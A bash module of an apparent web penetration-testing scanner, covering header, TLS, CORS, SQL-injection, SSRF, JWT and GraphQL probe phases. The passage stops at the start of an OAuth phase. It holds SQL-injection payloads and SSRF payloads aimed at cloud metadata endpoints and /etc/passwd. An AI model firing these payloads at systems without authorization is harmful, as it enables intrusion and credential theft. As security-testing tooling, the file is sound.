# shellcheck shell=bash
# Paintest — vulnerability phases.

# ============ Phase: basic_vuln_checks ============
do_basic_vuln_checks() {
    [ ! -s web/live.txt ] && return 0
    log "Basic web/TLS checks"

    : > vulns/basic_http_exposure.txt
    : > vulns/basic_insecure_cookies.txt
    : > vulns/basic_missing_security_headers.txt
    : > vulns/basic_server_disclosure.txt
    : > vulns/basic_outdated_versions.txt
    : > vulns/basic_extra_ports.txt
    : > vulns/basic_tls_legacy.txt
    : > vulns/basic_tls_name_mismatch.txt
    : > vulns/basic_sri_missing.txt
    : > vulns/basic_host_header_injection.txt
    : > vulns/basic_dangerous_methods.txt
    : > vulns/basic_directory_listing.txt
    : > vulns/basic_mixed_content.txt
    : > vulns/basic_checks.txt

    {
        [ "$TARGET_SCAN" != "$TARGET_HOST" ] && printf '%s\n' "$TARGET_SCAN"
        cat web/live.txt web/all_urls.txt subdomains/all.txt 2>/dev/null
    } | grep -E '^http://' \
        | sed 's/^/HTTP-CLEAR-TEXT\t/' \
        | sort -u > vulns/basic_http_exposure.txt

    if [ -s ports/naabu.txt ]; then
        awk '
            {
                line=$0
                port=line
                sub(/^.*:/, "", port)
                host=line
                sub(":[^:]*$", "", host)
                if (port !~ /^(80|443)$/ && host != "" && port != "") {
                    ports[host] = ports[host] ? ports[host] "," port : port
                }
            }
            END {
                for (host in ports) {
                    print "EXTRA-OPEN-PORTS\t" host "\t" ports[host]
                }
            }
        ' ports/naabu.txt | sort -u > vulns/basic_extra_ports.txt
    fi

    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)
    while read -r url; do
        [ -z "$url" ] && continue
        local host port proto http_url http_resp
        IFS=$'\t' read -r host port proto < <(url_host_port "$url")
        [ -z "$host" ] && continue
        http_url="http://${host}"
        http_resp=$(curl_p -sI --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$http_url" 2>/dev/null | head -1)
        printf '%s\n' "$http_resp" | grep -q '^HTTP/' \
            && printf 'HTTP-AVAILABLE\t%s\t%s\n' "$http_url" "$http_resp" >> vulns/basic_http_exposure.txt
    done < <(head -n "$BASIC_CHECK_LIMIT" web/live_dedup.txt)
    sort -u -o vulns/basic_http_exposure.txt vulns/basic_http_exposure.txt 2>/dev/null || true

    while read -r url; do
        [ -z "$url" ] && continue
        local resp proto server powered cookie_name cookie_lower header canary injected_resp injected_body methods
        proto="${url%%://*}"
        resp=$(curl_p -skI --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$url" 2>/dev/null)
        [ -z "$resp" ] && continue

        for header in strict-transport-security content-security-policy x-frame-options x-content-type-options referrer-policy permissions-policy; do
            if [ "$header" = "strict-transport-security" ] && [ "$proto" != "https" ]; then
                continue
            fi
            echo "$resp" | grep -qi "^${header}:" \
                || printf 'MISSING-HEADER\t%s\t%s\n' "$url" "$header" >> vulns/basic_missing_security_headers.txt
        done

        server=$(echo "$resp" | awk 'BEGIN{IGNORECASE=1} /^server:/ {sub(/^[^:]+:[[:space:]]*/, ""); print; exit}')
        if [ -n "$server" ]; then
            printf 'SERVER-HEADER\t%s\t%s\n' "$url" "$server" >> vulns/basic_server_disclosure.txt
            record_outdated_version_candidates "$url" "Server: $server"
        fi
        powered=$(echo "$resp" | awk 'BEGIN{IGNORECASE=1} /^x-powered-by:/ {sub(/^[^:]+:[[:space:]]*/, ""); print; exit}')
        if [ -n "$powered" ]; then
            printf 'X-POWERED-BY\t%s\t%s\n' "$url" "$powered" >> vulns/basic_server_disclosure.txt
            record_outdated_version_candidates "$url" "X-Powered-By: $powered"
        fi

        while IFS= read -r cookie; do
            [ -z "$cookie" ] && continue
            cookie_name=$(printf '%s' "$cookie" | sed -E 's/^[Ss]et-[Cc]ookie:[[:space:]]*([^=;]+).*/\1/')
            cookie_lower=$(printf '%s' "$cookie" | tr '[:upper:]' '[:lower:]')
            if [ "$proto" = "http" ]; then
                printf 'COOKIE-OVER-HTTP\t%s\t%s\n' "$url" "$cookie_name" >> vulns/basic_insecure_cookies.txt
            fi
            echo "$cookie_lower" | grep -q ';[[:space:]]*secure' \
                || printf 'COOKIE-MISSING-SECURE\t%s\t%s\n' "$url" "$cookie_name" >> vulns/basic_insecure_cookies.txt
            echo "$cookie_lower" | grep -q ';[[:space:]]*httponly' \
                || printf 'COOKIE-MISSING-HTTPONLY\t%s\t%s\n' "$url" "$cookie_name" >> vulns/basic_insecure_cookies.txt
            echo "$cookie_lower" | grep -q ';[[:space:]]*samesite=' \
                || printf 'COOKIE-MISSING-SAMESITE\t%s\t%s\n' "$url" "$cookie_name" >> vulns/basic_insecure_cookies.txt
        done < <(echo "$resp" | grep -i '^set-cookie:')

        canary="host-header-${RANDOM}.${CALLBACK_DOMAIN}"
        injected_resp=$(curl_p -skI --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" \
            -H "Host: ${canary}" -H "X-Forwarded-Host: ${canary}" "$url" 2>/dev/null)
        echo "$injected_resp" | grep -Fqi "$canary" \
            && printf 'HOST-HEADER-REFLECTED-HEADERS\t%s\t%s\n' "$url" "$canary" >> vulns/basic_host_header_injection.txt
        injected_body=$(curl_p -sk --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" \
            -H "Host: ${canary}" -H "X-Forwarded-Host: ${canary}" "$url" 2>/dev/null)
        echo "$injected_body" | grep -Fqi "$canary" \
            && printf 'HOST-HEADER-REFLECTED-BODY\t%s\t%s\n' "$url" "$canary" >> vulns/basic_host_header_injection.txt

        methods=$(curl_p -skI -X OPTIONS --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$url" 2>/dev/null \
            | awk 'BEGIN{IGNORECASE=1} /^allow:|^access-control-allow-methods:/ {sub(/^[^:]+:[[:space:]]*/, ""); print}' \
            | paste -sd, -)
        if printf '%s\n' "$methods" | grep -Eiq '(^|[,[:space:]])(TRACE|PUT|DELETE|CONNECT|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE)([,[:space:]]|$)'; then
            printf 'DANGEROUS-METHODS\t%s\t%s\n' "$url" "$methods" >> vulns/basic_dangerous_methods.txt
        fi

        curl_p -skI -X TRACE --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$url" 2>/dev/null \
            | head -1 | grep -Eq ' 2[0-9][0-9] ' \
            && printf 'TRACE-ENABLED\t%s\n' "$url" >> vulns/basic_dangerous_methods.txt
    done < <(head -n "$BASIC_CHECK_LIMIT" web/live.txt)

    while read -r url; do
        [ -z "$url" ] && continue
        local page host proto
        proto="${url%%://*}"
        host=$(url_host_port "$url" | cut -f1)
        page=$(curl_p -skL --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$url" 2>/dev/null)
        [ -z "$page" ] && continue

        printf '%s\n' "$page" | head -80 \
            | grep -Eiq '<title>[[:space:]]*Index of /|<h1>[[:space:]]*Index of /|Directory Listing For|Parent Directory' \
            && printf 'DIRECTORY-LISTING\t%s\n' "$url" >> vulns/basic_directory_listing.txt

        printf '%s\n' "$page" | tr '\n' ' ' \
            | grep -oiE '<script[^>]+src=["'\''][^"'\'']+["'\''][^>]*>' \
            | while IFS= read -r tag; do
                local src src_host
                if [ "$proto" = "https" ]; then
                    src=$(printf '%s\n' "$tag" | sed -nE 's/.*src=["'\'']([^"'\'']+)["'\''].*/\1/ip' | head -1)
                    [[ "$src" =~ ^http:// ]] \
                        && printf 'MIXED-CONTENT-SCRIPT\t%s\t%s\n' "$url" "$src" >> vulns/basic_mixed_content.txt
                fi
                echo "$tag" | grep -qi 'integrity=' && continue
                src=$(printf '%s\n' "$tag" | sed -nE 's/.*src=["'\'']([^"'\'']+)["'\''].*/\1/ip' | head -1)
                [[ "$src" =~ ^https?:// ]] || continue
                src_host=$(printf '%s\n' "$src" | sed -E 's#^https?://([^/:]+).*#\1#')
                [ "$src_host" = "$host" ] && continue
                printf 'SRI-MISSING-SCRIPT\t%s\t%s\n' "$url" "$src" >> vulns/basic_sri_missing.txt
            done

        printf '%s\n' "$page" | tr '\n' ' ' \
            | grep -oiE '<link[^>]+href=["'\''][^"'\'']+["'\''][^>]*>' \
            | grep -iE 'rel=["'\'']?stylesheet|as=["'\'']?style' \
            | while IFS= read -r tag; do
                local href href_host
                if [ "$proto" = "https" ]; then
                    href=$(printf '%s\n' "$tag" | sed -nE 's/.*href=["'\'']([^"'\'']+)["'\''].*/\1/ip' | head -1)
                    [[ "$href" =~ ^http:// ]] \
                        && printf 'MIXED-CONTENT-STYLESHEET\t%s\t%s\n' "$url" "$href" >> vulns/basic_mixed_content.txt
                fi
                echo "$tag" | grep -qi 'integrity=' && continue
                href=$(printf '%s\n' "$tag" | sed -nE 's/.*href=["'\'']([^"'\'']+)["'\''].*/\1/ip' | head -1)
                [[ "$href" =~ ^https?:// ]] || continue
                href_host=$(printf '%s\n' "$href" | sed -E 's#^https?://([^/:]+).*#\1#')
                [ "$href_host" = "$host" ] && continue
                printf 'SRI-MISSING-STYLESHEET\t%s\t%s\n' "$url" "$href" >> vulns/basic_sri_missing.txt
            done
    done < <(head -n "$BASIC_CHECK_LIMIT" web/live_dedup.txt)

    if have openssl; then
        while read -r url; do
            [ -z "$url" ] && continue
            [[ "$url" != https://* ]] && continue
            local host port proto cert_tmp tls_out
            IFS=$'\t' read -r host port proto < <(url_host_port "$url")
            [ -z "$host" ] && continue

            tls_out=$(timeout 10 openssl s_client -tls1 -servername "$host" -connect "${host}:${port}" </dev/null 2>/dev/null)
            echo "$tls_out" | grep -q 'Protocol  *: TLSv1$' \
                && printf 'TLS-1.0-SUPPORTED\t%s\t%s:%s\n' "$url" "$host" "$port" >> vulns/basic_tls_legacy.txt

            tls_out=$(timeout 10 openssl s_client -tls1_1 -servername "$host" -connect "${host}:${port}" </dev/null 2>/dev/null)
            echo "$tls_out" | grep -q 'Protocol  *: TLSv1.1$' \
                && printf 'TLS-1.1-SUPPORTED\t%s\t%s:%s\n' "$url" "$host" "$port" >> vulns/basic_tls_legacy.txt

            cert_tmp=$(mktemp)
            timeout 10 openssl s_client -servername "$host" -connect "${host}:${port}" </dev/null > "$cert_tmp" 2>/dev/null || true
            if [ -s "$cert_tmp" ] && openssl x509 -in "$cert_tmp" -noout >/dev/null 2>&1; then
                openssl x509 -in "$cert_tmp" -noout -checkhost "$host" 2>/dev/null \
                    | grep -qi 'does NOT match' \
                    && printf 'TLS-NAME-MISMATCH-SNI\t%s\t%s:%s\n' "$url" "$host" "$port" >> vulns/basic_tls_name_mismatch.txt
            fi
            rm -f "$cert_tmp"

            cert_tmp=$(mktemp)
            timeout 10 openssl s_client -connect "${host}:${port}" </dev/null > "$cert_tmp" 2>/dev/null || true
            if [ -s "$cert_tmp" ] && openssl x509 -in "$cert_tmp" -noout >/dev/null 2>&1; then
                openssl x509 -in "$cert_tmp" -noout -checkhost "$host" 2>/dev/null \
                    | grep -qi 'does NOT match' \
                    && printf 'TLS-NAME-MISMATCH-NO-SNI\t%s\t%s:%s\n' "$url" "$host" "$port" >> vulns/basic_tls_name_mismatch.txt
            fi
            rm -f "$cert_tmp"
        done < <(head -n "$TLS_CHECK_LIMIT" web/live_dedup.txt)
    fi

    for f in \
        vulns/basic_http_exposure.txt \
        vulns/basic_insecure_cookies.txt \
        vulns/basic_missing_security_headers.txt \
        vulns/basic_server_disclosure.txt \
        vulns/basic_outdated_versions.txt \
        vulns/basic_extra_ports.txt \
        vulns/basic_tls_legacy.txt \
        vulns/basic_tls_name_mismatch.txt \
        vulns/basic_tls_testssl.txt \
        vulns/basic_sri_missing.txt \
        vulns/basic_host_header_injection.txt \
        vulns/basic_dangerous_methods.txt \
        vulns/basic_directory_listing.txt \
        vulns/basic_mixed_content.txt; do
        [ -s "$f" ] && cat "$f"
    done | sort -u > vulns/basic_checks.txt

    return 0
}

# ============ Phase: vuln_scan ============
do_vuln_scan() {
    local hdrs
    mapfile -t hdrs < <(httpx_hdrs)

    if have nuclei; then
        nuclei -update-templates -silent 2>/dev/null

        log "Nuclei (consolidated, JSONL output)"
        if [ -s web/live_dedup.txt ]; then
            nuclei_p -l web/live_dedup.txt \
                -severity critical,high,medium,low \
                -exclude-tags intrusive,dos,fuzz,brute-force \
                -tags cve,exposure,misconfig,default-login,exposed-panels \
                -rl "$RATE" -c 25 -silent \
                "${hdrs[@]}" \
                -jsonl -o vulns/nuclei.jsonl 2>/dev/null
        fi

        if [ "$DEEP_MODE" -eq 1 ]; then
            log "Nuclei deep sweep"
            if [ -s web/live_dedup.txt ]; then
                nuclei_p -l web/live_dedup.txt \
                    -severity info,low,medium,high,critical \
                    -exclude-tags dos,brute-force \
                    -rl "$DEEP_RATE" -c "$DEEP_THREADS" -silent \
                    "${hdrs[@]}" \
                    -jsonl -o vulns/nuclei_deep_hosts.jsonl 2>/dev/null
            fi
            if [ -s web/all_urls.txt ]; then
                nuclei_p -l web/all_urls.txt \
                    -severity info,low,medium,high,critical \
                    -exclude-tags dos,brute-force \
                    -rl "$DEEP_RATE" -c "$DEEP_THREADS" -silent \
                    "${hdrs[@]}" \
                    -jsonl -o vulns/nuclei_deep_urls.jsonl 2>/dev/null
            fi
            cat vulns/nuclei.jsonl vulns/nuclei_deep_hosts.jsonl vulns/nuclei_deep_urls.jsonl \
                2>/dev/null | sort -u > vulns/nuclei_all.jsonl
        else
            cp vulns/nuclei.jsonl vulns/nuclei_all.jsonl 2>/dev/null || true
        fi

        if [ -s vulns/nuclei_all.jsonl ]; then
            jq -r 'select(.info.severity=="critical") | [.info.name,.host] | @tsv' \
                vulns/nuclei_all.jsonl > vulns/nuclei_critical.txt 2>/dev/null
            jq -r 'select(.info.severity=="high") | [.info.name,.host] | @tsv' \
                vulns/nuclei_all.jsonl > vulns/nuclei_high.txt 2>/dev/null
            jq -r 'select(.info.severity=="medium") | [.info.name,.host] | @tsv' \
                vulns/nuclei_all.jsonl > vulns/nuclei_medium.txt 2>/dev/null
        fi

        if [ "$SUBDOMAIN_MODE" -eq 1 ]; then
            nuclei_p -l subdomains/all.txt -t takeovers/ -silent \
                -rl "$RATE" "${hdrs[@]}" \
                -jsonl -o vulns/takeovers.jsonl 2>/dev/null
        fi
    fi

    if have dalfox && [ -s params/xss.txt ]; then
        log "Dalfox XSS"
        local dfx_hdrs=("$ID_HEADER")
        [ -n "${AUTH_HEADER:-}" ] && dfx_hdrs+=("$AUTH_HEADER")
        [ -n "${AUTH_COOKIE:-}" ] && dfx_hdrs+=("Cookie: $AUTH_COOKIE")

        local header_args=()
        for h in "${dfx_hdrs[@]}"; do header_args+=(--header "$h"); done

        dalfox file params/xss.txt --silence --no-spinner \
            "${header_args[@]}" --user-agent "$UA" \
            --delay 100 -o vulns/xss.txt 2>/dev/null
    fi

    [ -s params/sqli.txt ] && cp params/sqli.txt checklist/sqli_manual.txt

    if [ -s params/redirect.txt ] && have qsreplace; then
        head -50 params/redirect.txt \
            | qsreplace "https://${CALLBACK_DOMAIN}" \
            > checklist/openredirect_payloads.txt
    fi
    [ -s params/ssrf.txt ] && cp params/ssrf.txt checklist/ssrf_manual.txt

    log "CORS checks"
    local cors_tmp; cors_tmp=$(mktemp)
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)
    while read -r url; do
        [ -z "$url" ] && continue
        local resp
        resp=$(curl_p -sI --max-time 8 -A "$UA" "${c_hdrs[@]}" \
            -H "Origin: https://${CALLBACK_DOMAIN}" "$url" 2>/dev/null)
        if echo "$resp" | grep -qi "access-control-allow-origin: https://${CALLBACK_DOMAIN}"; then
            echo "REFLECTED: $url" >> "$cors_tmp"
        fi
        if echo "$resp" | grep -qi "access-control-allow-origin: null"; then
            echo "NULL-ALLOWED: $url" >> "$cors_tmp"
        fi
        # Trust arbitrary subdomain trick
        local evil_origin="https://evil.${TARGET_HOST}"
        resp=$(curl_p -sI --max-time 8 -A "$UA" "${c_hdrs[@]}" \
            -H "Origin: ${evil_origin}" "$url" 2>/dev/null)
        echo "$resp" | grep -qi "access-control-allow-origin: ${evil_origin}" \
            && echo "SUBDOMAIN-TRUSTED: $url" >> "$cors_tmp"
    done < <(head -50 web/live_dedup.txt)
    sort -u "$cors_tmp" > vulns/cors_manual.txt 2>/dev/null
    rm -f "$cors_tmp"

    do_basic_vuln_checks

    log "JWT surface scan"
    local jwt_tmp; jwt_tmp=$(mktemp)
    while read -r url; do
        [ -z "$url" ] && continue
        curl_p -sI --max-time 8 -A "$UA" "${c_hdrs[@]}" "$url" 2>/dev/null \
            | grep -iE "(authorization|set-cookie).*eyJ" >/dev/null \
            && echo "JWT-exposing: $url" >> "$jwt_tmp"
    done < <(head -30 web/live_dedup.txt)
    sort -u "$jwt_tmp" > checklist/jwt_endpoints.txt 2>/dev/null
    rm -f "$jwt_tmp"

    if have testssl.sh && [ -s web/live_dedup.txt ]; then
        timeout 180 testssl.sh --quiet --fast --color 0 "$(head -1 web/live_dedup.txt)" \
            > vulns/ssl.txt 2>/dev/null || true
        grep -Ei 'TLS 1|TLS1|SSLv|Trust \(hostname\)|certificate does not match|not match|mismatch' \
            vulns/ssl.txt 2>/dev/null | sort -u > vulns/basic_tls_testssl.txt
    fi

    if [ "$SUBDOMAIN_MODE" -eq 1 ]; then
        have subjack && subjack -w subdomains/all.txt -t 50 -timeout 30 -ssl \
            -c /usr/share/subjack/fingerprints.json \
            -o vulns/subjack.txt 2>/dev/null
    fi
    return 0
}

# ============ Phase: cve_correlate (NEW) ============
# Takes detected tech from web/tech.tsv and runs nuclei CVE templates
# tagged for that tech only. Much higher signal than nuclei full-sweep.
do_cve_correlate() {
    [ ! -s web/tech.tsv ] && return 0
    have nuclei || return 0
    mkdir -p vulns/cve

    awk -F'\t' 'NF>=2 && $2!="" {print $2}' web/tech.tsv \
        | tr ',' '\n' \
        | tr '[:upper:]' '[:lower:]' \
        | sed -E 's/[[:space:]]+/-/g; s/[^a-z0-9-]//g' \
        | sort -u | grep -v '^$' > vulns/cve/detected_tags.txt

    if [ ! -s vulns/cve/detected_tags.txt ]; then
        info "No tech signals for CVE correlation"
        return 0
    fi

    local tag_list
    tag_list=$(paste -sd, vulns/cve/detected_tags.txt | cut -c1-500)
    log "CVE correlation (nuclei -tags cve + detected: $tag_list)"

    local hdrs
    mapfile -t hdrs < <(httpx_hdrs)
    nuclei_p -l web/live_dedup.txt \
        -tags "cve,${tag_list}" \
        -severity critical,high,medium \
        -rl "$RATE" -c 25 -silent \
        "${hdrs[@]}" \
        -jsonl -o vulns/cve/nuclei_cve_correlated.jsonl 2>/dev/null

    [ -s vulns/cve/nuclei_cve_correlated.jsonl ] && \
        jq -r '[.info.name, .info.severity, .host, (.info.classification.["cve-id"][0]? // "")] | @tsv' \
        vulns/cve/nuclei_cve_correlated.jsonl > vulns/cve/correlated.tsv 2>/dev/null
    return 0
}

# ============ Phase: sqli_scan (NEW) ============
# Error-based + time-based SQLi with multi-DB payloads + optional sqlmap handoff.
do_sqli_scan() {
    [ ! -s web/all_urls.txt ] && return 0
    mkdir -p vulns/sqli
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)

    local error_payloads=(
        "'"
        "\""
        "')"
        "\"))"
        "' OR '1'='1"
        "' AND 1=CONVERT(int,(SELECT @@version))--"
        "%27"
    )
    local sql_err_re='SQL syntax|mysql_fetch|mysql_num_rows|ORA-[0-9]|PostgreSQL.*ERROR|SQLite.*error|ODBC .* Driver|Microsoft .* ODBC|MariaDB|You have an error in your SQL|SQLSTATE|SQLCommand|SqlException|pg_query\(\)|sqlite3.OperationalError|JDBC|Unclosed quotation mark'

    : > vulns/sqli/error_based.tsv
    : > vulns/sqli/time_based.tsv
    local target_set
    if [ -s params/sqli.txt ]; then
        target_set=$(head -200 params/sqli.txt)
    else
        target_set=$(grep '=' web/all_urls.txt | head -150)
    fi

    have qsreplace || { warn "sqli_scan requires qsreplace"; return 0; }

    log "SQLi error-based probe"
    local payload
    for payload in "${error_payloads[@]}"; do
        while read -r url; do
            [ -z "$url" ] && continue
            local test_url body
            test_url=$(printf '%s' "$url" | qsreplace "$payload")
            body=$(curl_p -skL --max-time "$HTTP_TIMEOUT" -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null)
            printf '%s' "$body" | grep -EiI "$sql_err_re" >/dev/null \
                && printf 'SQLI-ERROR\t%s\t%s\n' "$test_url" "$payload" >> vulns/sqli/error_based.tsv
        done <<< "$target_set"
    done
    sort -u -o vulns/sqli/error_based.tsv vulns/sqli/error_based.tsv 2>/dev/null || true

    log "SQLi time-based probe (mysql/pg/mssql)"
    local sleep_payloads=(
        "'%20AND%20SLEEP(5)--"
        "1)%20AND%20SLEEP(5)--"
        "';WAITFOR%20DELAY%20'0:0:5'--"
        "1%20AND%20(SELECT%20pg_sleep(5))--"
    )
    local delay_threshold=4
    for payload in "${sleep_payloads[@]}"; do
        while read -r url; do
            [ -z "$url" ] && continue
            local test_url t0 t1 dt
            test_url=$(printf '%s' "$url" | qsreplace "$payload")
            t0=$(date +%s)
            curl_p -sk -o /dev/null --max-time 12 -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null
            t1=$(date +%s)
            dt=$((t1 - t0))
            [ "$dt" -ge "$delay_threshold" ] \
                && printf 'SQLI-TIME\t%s\t%s\t%ss\n' "$test_url" "$payload" "$dt" >> vulns/sqli/time_based.tsv
        done < <(head -50 <<< "$target_set")
    done
    sort -u -o vulns/sqli/time_based.tsv vulns/sqli/time_based.tsv 2>/dev/null || true

    # Optional sqlmap handoff — only if explicitly allowed (SQLMAP_RISK set)
    if [ -n "${SQLMAP_RISK:-}" ] && have sqlmap && [ -s vulns/sqli/error_based.tsv ]; then
        log "sqlmap handoff on top candidates (risk=$SQLMAP_RISK)"
        awk -F'\t' '{print $2}' vulns/sqli/error_based.tsv | head -10 \
            > tmp/sqlmap_targets.txt
        sqlmap -m tmp/sqlmap_targets.txt --batch --random-agent \
            --risk "$SQLMAP_RISK" --level 2 --smart \
            --output-dir=vulns/sqli/sqlmap 2>/dev/null || true
    fi

    log "SQLi: error=$(wc -l < vulns/sqli/error_based.tsv), time=$(wc -l < vulns/sqli/time_based.tsv)"
    return 0
}

# ============ Phase: ssrf_verify (NEW) ============
# Actually tickles the callback host and records hit requests the user can
# correlate in interactsh/Burp Collaborator.
do_ssrf_verify() {
    [ ! -s web/all_urls.txt ] && return 0
    mkdir -p vulns/ssrf
    have qsreplace || { warn "ssrf_verify requires qsreplace"; return 0; }

    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)
    local canary_base="${CALLBACK_DOMAIN}"
    : > vulns/ssrf/requests_fired.tsv
    : > vulns/ssrf/localhost_probe.tsv

    local candidates
    if [ -s params/ssrf.txt ]; then
        candidates=$(head -150 params/ssrf.txt)
    else
        candidates=$(grep -Ei '(url|dest|redirect|uri|path|continue|next|data|site|domain|callback|return|feed|host|port|out|view|dir|show|open|image|img|fetch|load|proxy)=' \
            web/all_urls.txt | head -150)
    fi

    log "SSRF: firing callback pings (no execution, just URL triggers)"
    local tag
    while read -r url; do
        [ -z "$url" ] && continue
        tag="ssrf-$(echo "$url" | md5sum | cut -c1-8)"
        local payloads=(
            "https://${tag}.${canary_base}/"
            "http://${tag}.${canary_base}/"
            "//${tag}.${canary_base}/"
            "gopher://${tag}.${canary_base}/_"
        )
        for p in "${payloads[@]}"; do
            local test_url
            test_url=$(printf '%s' "$url" | qsreplace "$p")
            curl_p -sk -o /dev/null --max-time "$HTTP_TIMEOUT" \
                -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null
            printf '%s\t%s\t%s\n' "$test_url" "$p" "$tag" >> vulns/ssrf/requests_fired.tsv
        done

        # Metadata / localhost probes — look for 200 response with suggestive body
        local localhost_payloads=(
            "http://127.0.0.1/"
            "http://localhost/"
            "http://169.254.169.254/latest/meta-data/"
            "http://metadata.google.internal/computeMetadata/v1/"
            "file:///etc/passwd"
        )
        for lp in "${localhost_payloads[@]}"; do
            local test_url body
            test_url=$(printf '%s' "$url" | qsreplace "$lp")
            body=$(curl_p -skL --max-time 8 -A "$UA" "${c_hdrs[@]}" "$test_url" 2>/dev/null | head -c 2000)
            if printf '%s' "$body" | grep -EqiI 'ami-id|instance-id|iam/security-credentials|computeMetadata|root:x:0:0|daemon:'; then
                printf 'SSRF-METADATA\t%s\t%s\n' "$test_url" "$lp" >> vulns/ssrf/localhost_probe.tsv
            fi
        done
    done <<< "$candidates"

    sort -u -o vulns/ssrf/requests_fired.tsv vulns/ssrf/requests_fired.tsv 2>/dev/null || true
    sort -u -o vulns/ssrf/localhost_probe.tsv vulns/ssrf/localhost_probe.tsv 2>/dev/null || true
    log "SSRF: fired $(wc -l < vulns/ssrf/requests_fired.tsv) callbacks; metadata hits: $(wc -l < vulns/ssrf/localhost_probe.tsv)"
    info "SSRF verification: check your OAST listener for DNS/HTTP hits under *.${canary_base}"
    return 0
}

# ============ Phase: jwt_scan (NEW) ============
# Collects JWTs in responses/cookies/headers, runs jwt_tool if present,
# tests alg=none and weak-secret brute on collected tokens.
do_jwt_scan() {
    [ ! -s web/live_dedup.txt ] && return 0
    mkdir -p vulns/jwt
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)

    : > vulns/jwt/found_tokens.tsv
    log "JWT collection"
    while read -r url; do
        [ -z "$url" ] && continue
        local resp
        resp=$(curl_p -skI --max-time 8 -A "$UA" "${c_hdrs[@]}" "$url" 2>/dev/null)
        printf '%s\n' "$resp" | grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
            | while read -r tok; do
                printf '%s\t%s\n' "$url" "$tok" >> vulns/jwt/found_tokens.tsv
            done
    done < <(head -50 web/live_dedup.txt)
    sort -u -o vulns/jwt/found_tokens.tsv vulns/jwt/found_tokens.tsv 2>/dev/null || true

    if [ ! -s vulns/jwt/found_tokens.tsv ]; then
        info "No JWTs observed in response headers"
        return 0
    fi

    if have jwt_tool; then
        log "jwt_tool on collected tokens"
        : > vulns/jwt/jwt_tool.txt
        awk -F'\t' '{print $2}' vulns/jwt/found_tokens.tsv | sort -u \
            | while read -r tok; do
                [ -z "$tok" ] && continue
                printf '===== %s =====\n' "$tok" >> vulns/jwt/jwt_tool.txt
                jwt_tool "$tok" -M pb 2>/dev/null | head -60 >> vulns/jwt/jwt_tool.txt
            done
    fi

    # DIY alg=none re-sign attempt (inform only — no active re-submission)
    : > vulns/jwt/analysis.tsv
    awk -F'\t' '{print $2}' vulns/jwt/found_tokens.tsv | sort -u \
        | while read -r tok; do
            [ -z "$tok" ] && continue
            local header_b64="${tok%%.*}"
            local header_json
            header_json=$(printf '%s==' "$header_b64" | base64 -d 2>/dev/null)
            local alg
            alg=$(printf '%s' "$header_json" | jq -r '.alg // empty' 2>/dev/null)
            local kid
            kid=$(printf '%s' "$header_json" | jq -r '.kid // empty' 2>/dev/null)
            printf '%s\talg=%s\tkid=%s\n' "$tok" "$alg" "$kid" >> vulns/jwt/analysis.tsv
        done
    return 0
}

# ============ Phase: graphql_scan (NEW) ============
do_graphql_scan() {
    local ep_file="checklist/graphql_endpoints.txt"
    [ ! -s "$ep_file" ] && [ ! -s web/live_dedup.txt ] && return 0
    mkdir -p vulns/graphql
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)

    # If no GraphQL endpoints discovered, probe common paths
    if [ ! -s "$ep_file" ]; then
        : > "$ep_file"
        while read -r host; do
            [ -z "$host" ] && continue
            for p in /graphql /api/graphql /v1/graphql /graphiql /playground; do
                echo "${host%/}${p}" >> "$ep_file"
            done
        done < web/live_dedup.txt
        sort -u -o "$ep_file" "$ep_file"
    fi

    local introspection_query
    introspection_query='{"query":"query IntrospectionQuery{__schema{queryType{name} mutationType{name} types{name kind fields{name type{name kind ofType{name kind}}}}}}"}'

    : > vulns/graphql/introspection.tsv
    : > vulns/graphql/schema_dumps.json
    log "GraphQL introspection probe"
    while read -r ep; do
        [ -z "$ep" ] && continue
        local resp
        resp=$(curl_p -sk --max-time 8 -X POST \
            -H "Content-Type: application/json" \
            "${c_hdrs[@]}" -A "$UA" \
            -d "$introspection_query" "$ep" 2>/dev/null)
        if printf '%s' "$resp" | jq -e '.data.__schema' >/dev/null 2>&1; then
            printf 'GRAPHQL-INTROSPECTION\t%s\n' "$ep" >> vulns/graphql/introspection.tsv
            printf '%s\n' "$resp" >> vulns/graphql/schema_dumps.json
        fi
        # Suggestion-leak probe (typo query → sensitive field names)
        local suggest
        suggest=$(curl_p -sk --max-time 6 -X POST \
            -H "Content-Type: application/json" "${c_hdrs[@]}" -A "$UA" \
            -d '{"query":"query{__typenam}"}' "$ep" 2>/dev/null)
        printf '%s' "$suggest" | grep -qi '"did you mean"' \
            && printf 'GRAPHQL-SUGGESTIONS\t%s\n' "$ep" >> vulns/graphql/introspection.tsv
    done < "$ep_file"

    if have graphql-cop && [ -s vulns/graphql/introspection.tsv ]; then
        log "graphql-cop on introspective endpoints"
        : > vulns/graphql/graphql_cop.txt
        awk -F'\t' '{print $2}' vulns/graphql/introspection.tsv | sort -u \
            | while read -r ep; do
                [ -z "$ep" ] && continue
                printf '===== %s =====\n' "$ep" >> vulns/graphql/graphql_cop.txt
                graphql-cop -t "$ep" 2>/dev/null | head -80 >> vulns/graphql/graphql_cop.txt
            done
    fi
    return 0
}

# ============ Phase: oauth_scan (NEW) ============
do_oauth_scan() {
    [ ! -s web/all_urls.txt ] && return 0
    mkdir -p vulns/oauth
    local c_hdrs
    mapfile -t c_hdrs < <(curl_headers)

    grep -Ei '(oauth|authorize|redirect_uri|client_id|saml|RelayState)' web/all_urls.txt \
        | sort -u > vulns/oauth/candidates.txt

    : > vulns/oauth/redirect_bypass.tsv
